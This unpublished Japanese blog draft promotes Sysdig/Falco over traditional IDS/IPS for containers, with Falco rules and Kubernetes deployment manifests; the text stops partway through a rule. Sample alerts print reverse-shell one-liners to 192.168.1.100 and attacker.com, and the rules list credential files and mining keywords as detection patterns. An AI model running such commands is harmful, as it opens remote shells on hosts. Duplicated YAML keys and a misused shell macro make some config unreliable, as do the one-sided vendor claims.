---
title: "コンテナ時代のIDS/IPS：従来型セキュリティの限界とSysdigの優位性"
emoji: "🛡️"
type: "tech"
topics: ["kubernetes", "security", "sysdig", "container", "devops"]
published: false
---

# はじめに

本記事は、従来のIDS/IPSの仕組みから、コンテナ・Kubernetes環境における課題、そしてSysdigによる次世代ランタイムセキュリティまでを包括的に解説します。実際のデプロイ例やインシデント対応手順も含めた実践的な内容となっています。

# 1. IDS（Intrusion Detection System）とIPS（Intrusion Prevention System）の基本

## IDSとは

**侵入検知システム（IDS）** は、ネットワークやシステムへの不正アクセスや攻撃を**検知・通知する**セキュリティツールです。

### 主な特徴

- **受動的（Passive）**: 攻撃を検知して警告を出すが、自動的にはブロックしない
- **モード**: モニタリングモード（監視のみ）
- **目的**: セキュリティチームに脅威を通知し、分析・対応を促す
- **利点**: 誤検知（False Positive）があっても業務に影響を与えない
- **欠点**: 検知から対応までの間に攻撃が成功する可能性がある

## IPSとは

**侵入防止システム（IPS）** は、不正アクセスや攻撃を**検知し、自動的にブロックする**セキュリティツールです。

### 主な特徴

- **能動的（Active）**: 攻撃を検知すると自動的に遮断・防御
- **モード**: インラインモード（通信経路上に配置）
- **目的**: リアルタイムで脅威を阻止
- **利点**: 即座に攻撃を防ぐため、被害を最小化
- **欠点**: 誤検知で正常な通信をブロックし、業務に影響を与える可能性

## 比較表

| 項目 | IDS | IPS |
|------|-----|-----|
| **動作** | 検知・警告 | 検知・遮断 |
| **配置** | ネットワーク外（ミラーポート） | 通信経路上（インライン） |
| **応答** | 受動的 | 能動的 |
| **誤検知の影響** | 低（通知のみ） | 高（業務停止の可能性） |
| **保護レベル** | 低（人間の介入が必要） | 高（自動防御） |

# 2. 従来のIDS/IPSの仕組みと検知手法

## 検知方式

### (1) シグネチャベース検知（Signature-based Detection）

- **仕組み**: 既知の攻撃パターン（シグネチャ）と照合
- **利点**: 誤検知が少なく、高精度
- **欠点**: 新種の攻撃（ゼロデイ攻撃）は検知できない
- **例**: SQLインジェクション、クロスサイトスクリプティング（XSS）の既知パターン

### (2) アノマリベース検知（Anomaly-based Detection）

- **仕組み**: 正常な動作のベースラインを学習し、異常を検知
- **利点**: 未知の攻撃も検知可能
- **欠点**: 誤検知が多い、チューニングが困難
- **例**: 通常と異なるトラフィック量、異常なプロトコル使用

### (3) ポリシーベース検知（Policy-based Detection）

- **仕組み**: セキュリティポリシー違反を検知
- **利点**: 組織の要件に合わせたカスタマイズが可能
- **欠点**: ポリシー定義の手間
- **例**: 禁止ポートへのアクセス、許可されていないプロトコルの使用

## 従来のIDS/IPSの配置方法

### NIDS/NIPS（Network-based）

- **配置**: ネットワーク境界（ファイアウォール後、DMZ等）
- **監視対象**: ネットワークトラフィック
- **利点**: 複数のホストを一箇所で保護
- **欠点**: 暗号化通信（SSL/TLS）の中身は見えない

### HIDS/HIPS（Host-based）

- **配置**: 個々のサーバーやエンドポイント
- **監視対象**: システムコール、ファイル変更、ログ
- **利点**: 暗号化後のデータも監視可能、詳細な可視性
- **欠点**: 各ホストにエージェント導入が必要

## 従来のIDS/IPSの課題

1. **誤検知（False Positive）の多さ**: 大量のアラートで重要な脅威を見逃す
2. **チューニングの困難さ**: 環境に合わせた調整に専門知識と時間が必要
3. **暗号化トラフィックへの対応**: SSL/TLS通信が主流となり、NIDS/NIPSの効果が低下
4. **パフォーマンスへの影響**: インライン配置のIPSがボトルネックになる
5. **クラウド・コンテナ環境への不適合**: 動的に変化する環境に追従できない

# 3. コンテナ環境における従来のIDS/IPSの課題

## コンテナ環境の特性

### (1) 短命で動的（Ephemeral & Dynamic）

- コンテナは秒単位で起動・停止
- IPアドレスが動的に変化
- 従来のIPベース検知が機能しない

### (2) マイクロサービスアーキテクチャとトラフィックパターンの変化

マイクロサービスアーキテクチャの普及により、データセンター内のトラフィックパターンが劇的に変化しました。

#### North-South トラフィック（垂直通信）

**定義**: データセンター/クラウド環境の**境界を越える**トラフィック

```
        [インターネット]
             ↕ ← North (北：外部)
    ┌────────────────────┐
    │  ファイアウォール   │
    │  ロードバランサー   │
    └────────────────────┘
             ↕ ← South (南：内部)
    ┌────────────────────┐
    │ データセンター内部  │
    │  [Web] [API] [DB]  │
    └────────────────────┘
```

**特徴:**
- 外部ユーザー → 内部サービスへの通信
- 境界で監視・制御が可能（ファイアウォール、WAF等）
- 従来のIDS/IPSはこの境界に配置

**例:**
- ブラウザからWebサイトへのHTTPSリクエスト
- モバイルアプリからREST APIへのアクセス
- 外部SaaSサービスへのAPI呼び出し

#### East-West トラフィック（水平通信）

**定義**: データセンター/クラウド環境の**内部**でのサーバー間・コンテナ間通信

```
┌────────────────────────────────────────┐
│      データセンター内部                 │
│                                        │
│  [Web] ←→ [API] ←→ [Auth] ←→ [DB]    │
│    ↕        ↕        ↕        ↕       │
│  [Cache] [Queue] [Search] [Storage]   │
│                                        │
│  ← East (東西方向 = 水平方向) →        │
└────────────────────────────────────────┘
```

**特徴:**
- 内部サービス間の相互通信
- マイクロサービスでは**全トラフィックの80-90%を占める**
- 境界防御では監視できない
- 暗号化（TLS/mTLS）されていることが多い

**例:**
- フロントエンドコンテナ → APIゲートウェイ
- APIサーバー → 認証サービス
- 認証サービス → データベース
- サービスメッシュ内のサービス間通信

#### トラフィックパターンの変化

**従来型（モノリシック）:**
```
North-South: 90%  ← 監視の焦点
East-West:   10%
```

**マイクロサービス時代:**
```
North-South: 10-20%
East-West:   80-90%  ← 新たな課題
```

#### セキュリティ上の課題

**問題1: 境界防御の限界**
```
攻撃シナリオ:
1. 攻撃者がWebコンテナに侵入（North-South経由）
2. Webコンテナから内部APIへ横展開（East-West）
3. APIからデータベースへアクセス（East-West）
4. 機密データを窃取

→ 従来のファイアウォール/IDS/IPSは
  ステップ2以降を検知できない！
```

**問題2: 内部トラフィックの可視性**
- 従来のNIDS/NIPSは境界に配置されるため、内部通信が見えない
- Service Meshによる自動暗号化で、パケットレベルの検査が不可能
- コンテナの動的なIP変化により、IPベースの監視が機能しない

**問題3: ラテラルムーブメント（横展開）**
```
攻撃者の典型的な手法:
[侵入] → [偵察] → [権限昇格] → [横展開] → [データ窃取]
                                    ↑
                            East-Westトラフィック
                            を悪用した攻撃
```

#### Sysdigの優位性

従来型IDS/IPSがNorth-Southトラフィックの監視に特化しているのに対し、**Sysdigはシステムコールレベルで監視**するため：

✅ **East-Westトラフィックも完全に可視化**
- 暗号化前のデータを捕捉
- コンテナ間通信のコンテキスト（Pod名、Namespace等）を把握
- プロセスレベルでの通信元・通信先を特定

✅ **ラテラルムーブメントを即座に検知**
```yaml
- rule: Suspicious Network Connection
  condition: >
    outbound_connection and
    container and
    not expected_destinations
  output: >
    Unexpected outbound connection detected
    (source=%container.name dest=%fd.rip.name)
```

✅ **内部脅威にも対応**
- サービス間の異常な通信パターンを検知
- 権限外のサービスへのアクセスをブロック
- コンテナ内での不正な活動を即座に停止

### (3) オーケストレーション（Kubernetes等）

- 複雑なネットワーク構成（Service Mesh, CNI）
- 動的なスケーリング（Auto-scaling）
- ネームスペース、ポッド、サービスの概念

### (4) 暗号化が標準

- コンテナ間通信もTLS/mTLSで暗号化
- Service Meshによる自動暗号化
- ネットワークレベルでの可視性が低下

## 従来のIDS/IPSが抱える具体的な問題

### 問題1: 可視性の欠如

```
従来のNIDS/NIPS:
[コンテナA] → [コンテナB] → [コンテナC]
     ↓              ↓              ↓
  暗号化通信    暗号化通信    暗号化通信
     ↓              ↓              ↓
  [NIDS] ← 内容が見えない！
```

### 問題2: コンテキストの喪失

- **ネットワークレベル**: `10.0.1.23:8080 → 10.0.2.45:3000`
- **必要な情報**:
  - どのPodからどのPodへ？
  - どのNamespace？
  - どのServiceアカウント？
  - コンテナイメージは？
  - プロセスは何を実行している？

従来のNIDS/NIPSではIPとポートしか見えず、上記のコンテキストが失われます。

### 問題3: スケールの課題

- 1000コンテナ × 平均10通信/秒 = 10,000イベント/秒
- 従来のシグネチャマッチングでは処理が追いつかない
- ログの保存とクエリも困難

### 問題4: デプロイメントの複雑さ

```yaml
# 従来のHIPS: 各ノードにエージェント導入が必要
Node1: [HIPS Agent] + [Container1, Container2, ...]
Node2: [HIPS Agent] + [Container3, Container4, ...]
Node3: [HIPS Agent] + [Container5, Container6, ...]

課題:
- エージェントの更新管理
- コンテナ内へのエージェント注入の手間
- リソースオーバーヘッド
```

### 問題5: ランタイムセキュリティへの未対応

コンテナ内で以下のような脅威は従来のネットワークベース検知では捉えられない：

- 不正なシェル起動（Reverse Shell）
- ファイルシステムへの不正書き込み
- 権限昇格（Privilege Escalation）
- 機密ファイルへのアクセス
- 暗号通貨マイニング

# 4. Sysdigのアプローチとコンテナ時代の優位性

## Sysdigの革新的アプローチ

Sysdigは従来のIDS/IPSとは根本的に異なる**ランタイム脅威検知・防御プラットフォーム**です。

## 4-1. システムコールレベルでの監視（eBPF/Kernel Module）

### 仕組み

```
アプリケーション
    ↓
システムコール (open, execve, connect, etc.)
    ↓
[Sysdig Agent with eBPF]  ← カーネルレベルで全て捕捉
    ↓
リッチなコンテキスト情報
```

### 従来のネットワーク監視との違い

| 従来のNIDS/NIPS | Sysdig |
|----------------|---------|
| ネットワークパケット | システムコール |
| IPアドレス:ポート | プロセス、コンテナ、K8sメタデータ |
| 暗号化通信は見えない | 暗号化前/後のデータも見える |
| ネットワーク動作のみ | ファイル、プロセス、ネットワーク全て |

### 実例：不正なシェル検知

**従来のIDS:**
```
× ネットワークトラフィックからは検知不可能
```

**Sysdig:**
```yaml
- rule: Terminal shell in container
  desc: Detect shell being spawned in a container
  condition: >
    spawned_process and
    container and
    shell_procs and
    proc.tty != 0
  output: >
    Shell spawned in container (user=%user.name
    container=%container.name image=%container.image.repository
    shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)
  priority: WARNING
```

**検知内容:**

- どのユーザーが
- どのコンテナで
- どのイメージから
- どの親プロセスから
- どんなコマンドで

シェルを起動したかを全て把握可能

## 4-2. Falcoルールエンジン

### 特徴

- **CNCF（Cloud Native Computing Foundation）のGraduatedプロジェクト**（2024年2月卒業）
- コンテナ・Kubernetes環境に特化した脅威検知ルール
- YAML形式で記述可能、カスタマイズ容易
- 86の公式管理ルール（25の安定版ルールがデフォルト同梱）+ カスタムルール追加可能

### 検知レイヤー

```
┌─────────────────────────────────────┐
│  K8s Audit Log (API Server)        │ ← K8s APIレベルの脅威
├─────────────────────────────────────┤
│  Runtime Activity (Syscalls)       │ ← コンテナランタイム脅威
├─────────────────────────────────────┤
│  Cloud Provider (CloudTrail等)     │ ← クラウドインフラ脅威
└─────────────────────────────────────┘
```

### 実例：Kubernetes特有の脅威検知

```yaml
# 特権コンテナの作成を検知
- rule: Create Privileged Pod
  desc: Detect creation of a privileged pod
  condition: >
    kevt and pod and kcreate and
    ka.req.pod.containers.privileged intersects (true)
  output: >
    Privileged pod created (user=%ka.user.name
    pod=%ka.resp.name ns=%ka.target.namespace
    images=%ka.req.pod.containers.image)
  priority: WARNING
  source: k8s_audit
```

従来のIDS/IPSでは**不可能**な検知です。

## 4-3. リッチなコンテキスト情報

### Sysdigが収集するメタデータ

**コンテナレベル:**
- コンテナID、名前
- イメージ名、タグ、レジストリ
- ラベル

**Kubernetesレベル:**
- Pod名、Namespace
- Deployment、ReplicaSet
- Service、ServiceAccount
- ノード情報

**プロセスレベル:**
- プロセスID、親プロセス
- コマンドライン引数
- ユーザー、グループ
- プロセスツリー

**ネットワークレベル:**
- 送信元/宛先IP、ポート
- プロトコル
- データペイロード（暗号化前）

### 実例：攻撃の完全なコンテキスト

```
従来のIDS:
Alert: Suspicious connection to 192.168.1.100:4444

Sysdig:
Alert: Reverse shell detected
- User: www-data
- Container: nginx-frontend-xyz123
- Image: myregistry.io/nginx:1.19-vulnerable
- Namespace: production
- Pod: web-app-7d9f8c-abcde
- Process: /bin/bash
- Parent: nginx (compromised)
- Command: bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
- Network: 10.0.2.45:random → 192.168.1.100:4444
- Triggered Rule: "Reverse Shell Connection"
```

## 4-4. Runtime Protection（自動ブロック機能）

### IDSからIPSへの進化

Sysdigは**IDS（検知）とIPS（防御）の両方**を提供します。

**Drift Prevention（ドリフト防止）:**

```
学習フェーズ:
コンテナの正常な動作を自動学習
↓
本番フェーズ:
学習した動作以外は自動ブロック
```

**実例：**

```
許可された動作:
✓ nginx プロセスが port 80 で listen
✓ nginx が /var/www/html を read
✓ nginx が access.log に write

自動ブロックされる動作:
✗ bash シェルの起動
✗ /etc/passwd の読み取り
✗ 外部への不審な接続
✗ 新しいバイナリのダウンロード・実行
```

**Kill Process機能:**

```yaml
- rule: Unauthorized Process
  enabled: true
  actions:
    - kill  # 不正プロセスを即座にKill
```

## 4-5. Managed Policy（MITRE ATT&CK対応）

Sysdigは**MITRE ATT&CK for Containers**フレームワークに完全対応しています。

### カバレッジ

| MITRE ATT&CK戦術 | Sysdig検知例 |
|------------------|--------------|
| Initial Access | 脆弱性を持つコンテナイメージのデプロイ |
| Execution | コンテナ内でのスクリプト・バイナリ実行 |
| Persistence | Cronジョブの不正な追加 |
| Privilege Escalation | 特権コンテナへのエスカレーション |
| Defense Evasion | Falco/監視エージェントの停止試行 |
| Credential Access | /etc/shadow, AWS credentials へのアクセス |
| Discovery | kubectl コマンドによる環境調査 |
| Lateral Movement | 他コンテナ・Podへの不正アクセス |
| Collection | 機密ファイルの収集 |
| Exfiltration | 大量データの外部送信 |
| Impact | リソース枯渇、Cryptomining |

## 4-6. クラウドネイティブアーキテクチャ

### エージェントレスではない、でも軽量

```
各Kubernetes Node:
┌────────────────────────────────────┐
│  Sysdig Agent (DaemonSet)         │
│  - eBPF/Kernel Module             │
│  - CPU: 1-5% per node             │
│  - Memory: 200-500MB per node     │
├────────────────────────────────────┤
│  [Container] [Container] ...      │
│  エージェント注入不要              │
└────────────────────────────────────┘
```

**利点:**

- コンテナイメージ変更不要
- アプリケーション再ビルド不要
- 最小限のリソースオーバーヘッド

## 4-7. 統合プラットフォーム

Sysdigは単なるIDS/IPSではなく、**CNAPP（Cloud-Native Application Protection Platform）**です。

```
┌─────────────────────────────────────────┐
│  Sysdig Secure                         │
├─────────────────────────────────────────┤
│  ◆ Image Scanning (脆弱性スキャン)       │
│  ◆ IaC Scanning (Terraform等)          │
│  ◆ Runtime Threat Detection (本IDS/IPS) │
│  ◆ Runtime Protection (自動ブロック)     │
│  ◆ Compliance (CIS, PCI-DSS等)         │
│  ◆ Posture Management (設定診断)        │
│  ◆ Forensics (フォレンジック)           │
└─────────────────────────────────────────┘
```

# 5. Sysdigの優位性まとめ

## 従来のIDS/IPSとの比較表

| 項目 | 従来のNIDS/NIPS | 従来のHIDS/HIPS | **Sysdig** |
|------|-----------------|-----------------|------------|
| **監視レイヤー** | ネットワーク | ホスト | **システムコール（カーネル）** |
| **暗号化通信** | × 見えない | △ 一部 | **○ 全て見える** |
| **コンテナ対応** | × | △ エージェント注入必要 | **○ ネイティブ対応** |
| **K8s可視性** | × | × | **○ 完全対応** |
| **リッチコンテキスト** | × IPのみ | △ ホスト情報のみ | **○ 全レイヤー** |
| **ランタイム防御** | × | △ 限定的 | **○ Drift Prevention** |
| **デプロイ** | ハードウェア/VM | 各ホストにエージェント | **○ DaemonSet** |
| **パフォーマンス** | △ ボトルネック | △ 各ホストで負荷 | **○ eBPF（低負荷）** |
| **MITRE ATT&CK** | 一部のみ | 一部のみ | **○ 完全対応** |
| **カスタマイズ** | 困難 | 困難 | **○ Falco YAML** |

## Sysdig独自の価値

### 1. "Security as Code"

```yaml
# ルールをGit管理、CI/CDで自動デプロイ可能
- rule: My Custom Detection
  condition: container and proc.name = "suspicious_binary"
  output: "Detected: %proc.cmdline in %container.name"
```

### 2. ゼロトラストアーキテクチャに最適

- デフォルト拒否（Drift Prevention）
- 最小権限の原則を強制
- マイクロセグメンテーション対応

### 3. 開発者フレンドリー

- CI/CDパイプラインへの統合
- Shift-Left（左シフト）: ビルド時に脆弱性検知
- Shift-Right（右シフト）: ランタイムで継続的監視

### 4. 規制対応

- PCI-DSS
- HIPAA
- SOC 2
- CIS Benchmarks
- NIST

自動レポート生成でコンプライアンス監査を効率化

### 5. Attack Path分析

```
攻撃の流れを可視化:
CVE-2023-XXXXX (脆弱性)
    ↓
Initial Access (コンテナ侵入)
    ↓
Privilege Escalation (権限昇格)
    ↓
Lateral Movement (横展開)
    ↓
Data Exfiltration (データ窃取)
```

全ての段階で検知・ブロック可能

## 実際のユースケース比較

### ケース: Reverse Shell攻撃

**従来のNIDS:**
```
検知: 不可能（暗号化されたHTTPS内で実行）
```

**従来のHIPS:**
```
検知: 可能（シェルプロセス検知）
問題: コンテナ環境では配置が困難
```

**Sysdig:**
```
検知: リアルタイム
Alert: "Reverse Shell in Container"
- Container: payment-service
- Image: vulnerable-app:v1.2
- User: www-data (compromised)
- Command: /bin/bash -i >& /dev/tcp/attacker.com/4444
- Parent: php-fpm (vulnerable endpoint)

対応: 自動Kill Process + Container隔離
```

# 6. 結論：なぜコンテナ時代にSysdigが必要か

## パラダイムシフト

```
従来のセキュリティ: ネットワーク境界防御
         ↓
コンテナ時代: ランタイム中心防御
```

## Sysdigを選ぶべき理由

1. **完全な可視性**: システムコールレベルで全てを監視
2. **クラウドネイティブ**: Kubernetes環境に最適化
3. **リアルタイム防御**: 検知だけでなく自動ブロック
4. **統合プラットフォーム**: ビルドからランタイムまでカバー
5. **運用効率**: 低い誤検知率、高度な自動チューニング
6. **コンプライアンス**: 規制要件への自動対応
7. **スケーラビリティ**: 数千ノードでも軽量動作

## 最終メッセージ

従来のIDS/IPSは**ネットワーク時代の遺産**です。

コンテナ・Kubernetes・マイクロサービスの時代において、Sysdigのような**ランタイム脅威検知プラットフォーム**が新しい標準となります。

暗号化通信、動的インフラ、短命コンテナ、East-Westトラフィック——これら全てに対応できるのは、**システムコールレベルでの深い可視性**を持つSysdigだけです。

---

# 7. Sysdig Agentのデプロイ

## 7-1. Helmを使った基本的なデプロイ

### 前提条件

```bash
# Helmがインストールされていること
helm version

# Kubernetesクラスタへの接続が確立されていること
kubectl cluster-info
```

### デプロイ手順

```bash
# 1. Sysdig Helmリポジトリを追加
helm repo add sysdig https://charts.sysdig.com
helm repo update

# 2. Namespaceを作成
kubectl create namespace sysdig-agent

# 3. Sysdig Access Keyをシークレットとして作成
kubectl create secret generic sysdig-agent-secret \
  --from-literal=access-key=YOUR_SYSDIG_ACCESS_KEY \
  -n sysdig-agent

# 4. values.yamlをカスタマイズしてデプロイ
helm install sysdig-agent sysdig/sysdig-deploy \
  --namespace sysdig-agent \
  --values values.yaml
```

## 7-2. カスタムvalues.yaml

```yaml
# values.yaml - 本番環境向け設定例

global:
  # Sysdig SaaSリージョン (us1, us2, us3, us4, eu1, au1等)
  sysdig:
    region: "us1"

  # クラスタ名（Sysdig UIで表示される名前）
  clusterConfig:
    name: "production-eks-cluster"

# Sysdig Agent設定
agent:
  enabled: true

  # リソース設定（本番推奨値）
  resources:
    requests:
      cpu: 1000m
      memory: 1024Mi
    limits:
      cpu: 1000m
      memory: 1024Mi

  # eBPFを有効化（推奨、Kernel Module不要）
  ebpf:
    enabled: true

  # Slim Agentイメージを使用（サイズ削減）
  slim:
    enabled: true

  # 収集設定
  sysdig:
    settings:
      # メトリクス収集間隔（秒）
      app_checks_interval: 80

      # タグ付け（環境識別）
      tags:
        - "env:production"
        - "region:us-west-2"
        - "team:platform"

      # セキュリティ機能を有効化
      security:
        enabled: true

      # コマンドライン引数のキャプチャ長
      commandlines_capture:
        enabled: true
        length: 4096

# Node Analyzerの設定（脆弱性スキャン用）
nodeAnalyzer:
  enabled: true

  nodeAnalyzer:
    # ランタイムスキャナー
    runtimeScanner:
      enabled: true
      settings:
        eveEnabled: true  # 実行中コンテナのスキャン

    # ホストスキャナー
    hostScanner:
      enabled: true

    # ベンチマークランナー（CIS Benchmark）
    benchmarkRunner:
      enabled: true

# Kubernetes Audit Log統合
kspmCollector:
  enabled: true

# Admission Controller（ポリシー違反のデプロイをブロック）
admissionController:
  enabled: true

  # デフォルトはDryRun、本番ではEnforce推奨
  denyOnError: false
  dryRun: false

  webhook:
    timeoutSeconds: 10

# Cloud Connector（クラウドアカウント統合）
# AWSの場合
cloudConnector:
  aws:
    enabled: true
    # IAM RoleのARNを指定
    roleArn: "arn:aws:iam::123456789012:role/SysdigCloudConnector"

# Prometheus互換メトリクス収集
nodeAnalyzer:
  nodeAnalyzer:
    hostAnalyzer:
      enabled: true

# カスタムFalcoルールのConfigMap指定
agent:
  sysdig:
    settings:
      falco:
        # カスタムルールファイル
        customRules:
          custom-rules.yaml: |-
            - rule: My Custom Shell Detection
              desc: Detect interactive shell in production namespace
              condition: >
                spawned_process and
                container and
                k8s.ns.name = "production" and
                shell_procs and
                proc.tty != 0
              output: >
                Shell in production container
                (user=%user.name container=%container.name
                image=%container.image.repository
                shell=%proc.name cmdline=%proc.cmdline)
              priority: CRITICAL
              tags: [container, shell, production]
```

## 7-3. DaemonSet マニフェスト（直接デプロイする場合）

```yaml
# sysdig-agent-daemonset.yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: sysdig-agent
  namespace: sysdig-agent
  labels:
    app: sysdig-agent
spec:
  selector:
    matchLabels:
      app: sysdig-agent
  updateStrategy:
    type: RollingUpdate
    rollingUpdate:
      maxUnavailable: 1
  template:
    metadata:
      labels:
        app: sysdig-agent
    spec:
      serviceAccountName: sysdig-agent
      hostNetwork: true
      hostPID: true
      dnsPolicy: ClusterFirstWithHostNet

      # 優先度を高く設定
      priorityClassName: system-node-critical

      tolerations:
        # マスターノードにも配置
        - effect: NoSchedule
          key: node-role.kubernetes.io/master
        - effect: NoSchedule
          key: node-role.kubernetes.io/control-plane

      containers:
      - name: sysdig-agent
        image: quay.io/sysdig/agent-slim:latest
        imagePullPolicy: Always

        securityContext:
          # 特権コンテナとして実行（必須）
          privileged: true
          capabilities:
            add:
              - SYS_ADMIN
              - SYS_RESOURCE
              - SYS_PTRACE

        env:
        # アクセスキー
        - name: ACCESS_KEY
          valueFrom:
            secretKeyRef:
              name: sysdig-agent-secret
              key: access-key

        # コレクターエンドポイント
        - name: COLLECTOR
          value: "collector.sysdigcloud.com"

        # クラスタ名
        - name: CLUSTER_NAME
          value: "production-k8s"

        # タグ
        - name: TAGS
          value: "env:prod,region:us-west-2"

        # eBPF有効化
        - name: SYSDIG_BPF_PROBE
          value: ""

        resources:
          requests:
            cpu: 1000m
            memory: 1024Mi
          limits:
            cpu: 1000m
            memory: 1024Mi

        volumeMounts:
        # ホストのルートファイルシステム
        - mountPath: /host/dev
          name: dev-vol
          readOnly: false
        - mountPath: /host/proc
          name: proc-vol
          readOnly: true
        - mountPath: /host/boot
          name: boot-vol
          readOnly: true
        - mountPath: /host/lib/modules
          name: modules-vol
          readOnly: true
        - mountPath: /host/usr
          name: usr-vol
          readOnly: true
        - mountPath: /host/run
          name: run-vol
        - mountPath: /host/var/run
          name: varrun-vol
        - mountPath: /dev/shm
          name: dshm
        - mountPath: /opt/draios/etc/kubernetes/config
          name: sysdig-agent-config
        - mountPath: /opt/draios/etc/kubernetes/secrets
          name: sysdig-agent-secrets

      volumes:
      - name: dshm
        emptyDir:
          medium: Memory
      - name: dev-vol
        hostPath:
          path: /dev
      - name: proc-vol
        hostPath:
          path: /proc
      - name: boot-vol
        hostPath:
          path: /boot
      - name: modules-vol
        hostPath:
          path: /lib/modules
      - name: usr-vol
        hostPath:
          path: /usr
      - name: run-vol
        hostPath:
          path: /run
      - name: varrun-vol
        hostPath:
          path: /var/run
      - name: sysdig-agent-config
        configMap:
          name: sysdig-agent
          optional: true
      - name: sysdig-agent-secrets
        secret:
          secretName: sysdig-agent-secret

---
# ServiceAccount
apiVersion: v1
kind: ServiceAccount
metadata:
  name: sysdig-agent
  namespace: sysdig-agent

---
# ClusterRole
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: sysdig-agent
rules:
- apiGroups:
  - ""
  resources:
  - pods
  - replicationcontrollers
  - services
  - endpoints
  - events
  - limitranges
  - namespaces
  - nodes
  - resourcequotas
  - persistentvolumes
  - persistentvolumeclaims
  - configmaps
  verbs:
  - get
  - list
  - watch
- apiGroups:
  - apps
  resources:
  - daemonsets
  - deployments
  - replicasets
  - statefulsets
  verbs:
  - get
  - list
  - watch
- apiGroups:
  - batch
  resources:
  - jobs
  - cronjobs
  verbs:
  - get
  - list
  - watch
- apiGroups:
  - autoscaling
  resources:
  - horizontalpodautoscalers
  verbs:
  - get
  - list
  - watch
- nonResourceURLs:
  - /version
  - /healthz
  verbs:
  - get

---
# ClusterRoleBinding
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: sysdig-agent
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: sysdig-agent
subjects:
- kind: ServiceAccount
  name: sysdig-agent
  namespace: sysdig-agent
```

## 7-4. デプロイ後の確認

```bash
# 1. Pod状態確認
kubectl get pods -n sysdig-agent -o wide

# 期待される出力例:
# NAME                  READY   STATUS    RESTARTS   AGE   NODE
# sysdig-agent-abc12    1/1     Running   0          2m    node-1
# sysdig-agent-def34    1/1     Running   0          2m    node-2
# sysdig-agent-ghi56    1/1     Running   0          2m    node-3

# 2. ログ確認（正常に接続されているか）
kubectl logs -n sysdig-agent -l app=sysdig-agent --tail=50

# 期待されるログ:
# [INFO] Sysdig Agent connected to collector
# [INFO] eBPF probe loaded successfully
# [INFO] Starting event collection

# 3. Agentバージョン確認
kubectl exec -n sysdig-agent $(kubectl get pod -n sysdig-agent -l app=sysdig-agent -o jsonpath='{.items[0].metadata.name}') -- /opt/draios/bin/dragent --version

# 4. Sysdig UI でクラスタが見えるか確認
# https://app.sysdigcloud.com/ にログイン
# Infrastructure > Kubernetes > Clusters で確認
```

# 8. Runtime Policy設定例

## 8-1. Runtime Policyの基本概念

Runtime Policyは以下の要素で構成されます：

1. **Rules（ルール）**: Falcoルールベースの脅威検知定義
2. **Actions（アクション）**: 検知時の動作（Alert, Kill, Pause, Stop）
3. **Scope（スコープ）**: 適用範囲（クラスタ、Namespace、ラベル等）

## 8-2. カスタムFalcoルールの作成

### 基本的なルール構文

```yaml
# custom-falco-rules.yaml

# ルール1: 本番環境での対話的シェル検知
- rule: Interactive Shell in Production
  desc: |
    本番環境のコンテナで対話的シェルが起動されました。
    これは攻撃者によるリバースシェルや、
    不適切な運用オペレーションの可能性があります。
  condition: >
    spawned_process and
    container and
    k8s.ns.name = "production" and
    shell_procs and
    proc.tty != 0 and
    not proc.name in (allowed_shells)
  output: >
    Production環境でシェルが検知されました
    (user=%user.name user_uid=%user.uid
    container=%container.name image=%container.image.repository
    ns=%k8s.ns.name pod=%k8s.pod.name
    shell=%proc.name parent=%proc.pname
    cmdline=%proc.cmdline terminal=%proc.tty)
  priority: CRITICAL
  tags: [container, shell, production, mitre_execution]

# マクロ定義（再利用可能な条件）
- macro: allowed_shells
  condition: (proc.name in (sh, bash, zsh))

# ルール2: 機密ファイルへの読み取り
- rule: Read Sensitive File
  desc: |
    /etc/shadow, /etc/passwdなどの機密ファイルへの
    アクセスが検知されました
  condition: >
    open_read and
    container and
    sensitive_files and
    not proc.name in (trusted_programs)
  output: >
    機密ファイルへのアクセス
    (file=%fd.name user=%user.name
    container=%container.name image=%container.image.repository
    process=%proc.name cmdline=%proc.cmdline
    parent=%proc.pname)
  priority: WARNING
  tags: [filesystem, credential_access]

- macro: sensitive_files
  condition: >
    fd.name in (/etc/shadow, /etc/passwd, /etc/sudoers,
                /root/.ssh/id_rsa, /root/.ssh/id_dsa,
                /root/.aws/credentials, /root/.docker/config.json)

- list: trusted_programs
  items: [sysdig-agent, node-exporter, datadog-agent]


# ルール3: 暗号通貨マイニングツール検知
- rule: Crypto Mining Detected
  desc: |
    暗号通貨マイニングツールの実行が検知されました
  condition: >
    spawned_process and
    container and
    (proc.name in (cryptomining_tools) or
     proc.cmdline contains "stratum+tcp" or
     proc.cmdline contains "xmrig" or
     proc.cmdline contains "pool.minexmr.com")
  output: >
    暗号通貨マイニング検知
    (container=%container.name image=%container.image.repository
    process=%proc.name cmdline=%proc.cmdline
    user=%user.name)
  priority: CRITICAL
  tags: [malware, cryptomining, impact]

- list: cryptomining_tools
  items: [xmrig, minerd, cpuminer, ethminer, ccminer]


# ルール4: 権限昇格の試み
- rule: Privilege Escalation Attempt
  desc: |
    sudo, su, setuidなどによる権限昇格の試みを検知
  condition: >
    spawned_process and
    container and
    (proc.name in (sudo, su, setuid, doas) or
     (spawned_process and proc.user != proc.puser))
  output: >
    権限昇格の試み
    (user=%user.name target_user=%proc.user
    container=%container.name process=%proc.name
    cmdline=%proc.cmdline parent=%proc.pname)
  priority: WARNING
  tags: [privilege_escalation, container]


# ルール5: コンテナ内でのパッケージ管理ツール実行
- rule: Package Management in Container
  desc: |
    実行中コンテナ内でのapt, yum等のパッケージインストールを検知
    これは不変インフラの原則違反、またはコンテナ侵害の兆候
  condition: >
    spawned_process and
    container and
    package_mgmt_procs and
    not k8s.ns.name in (development, staging)
  output: >
    コンテナ内でのパッケージインストール
    (container=%container.name image=%container.image.repository
    ns=%k8s.ns.name process=%proc.name
    cmdline=%proc.cmdline user=%user.name)
  priority: WARNING
  tags: [container, package_management, defense_evasion]

- macro: package_mgmt_procs
  condition: >
    proc.name in (apt, apt-get, yum, dnf, rpm, dpkg,
                  apk, pip, gem, npm, composer)


# ルール6: 外部への大量データ送信
- rule: Large Outbound Data Transfer
  desc: |
    短時間での大量データ送信を検知（データ窃取の可能性）
  condition: >
    evt.type = sendto and
    container and
    fd.type = ipv4 and
    evt.bytes > 100000000 and  # 100MB以上
    not fd.sip in (rfc_1918_addresses)
  output: >
